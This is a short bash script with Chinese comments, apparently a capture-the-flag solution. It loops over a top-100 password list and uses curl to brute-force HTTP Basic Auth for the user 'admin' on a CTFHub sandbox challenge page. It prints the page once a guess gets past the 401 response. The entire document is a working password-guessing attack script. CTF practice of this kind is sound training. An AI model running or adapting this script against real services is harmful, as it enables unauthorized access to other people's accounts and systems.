while IFS= read -r password; do
    echo "正在尝试密码: $password"
    # 使用curl尝试，并将响应输出保存到变量，通常我们只关心是否成功（状态码不是401）
    # -s 静默模式，-o /dev/null 丢弃正常输出，-w 只显示HTTP状态码
    status_code=$(curl -u "admin:$password" \
                      -s -o /dev/null -w "%{http_code}" \
                      http://challenge-c08791e1c89783bc.sandbox.ctfhub.com:10800/flag.html)
    
    if [ "$status_code" != "401" ]; then
        echo -e "\n[+] 成功！用户名: admin, 密码: $password"
        echo "[+] 状态码: $status_code"
        echo "[+] 尝试获取完整响应内容:"
        curl -u "admin:$password" -s http://challenge-c08791e1c89783bc.sandbox.ctfhub.com:10800/flag.html
        break # 找到后退出循环
    fi
done < "10_million_password_list_top_100.txt"
echo "字典遍历完毕。"
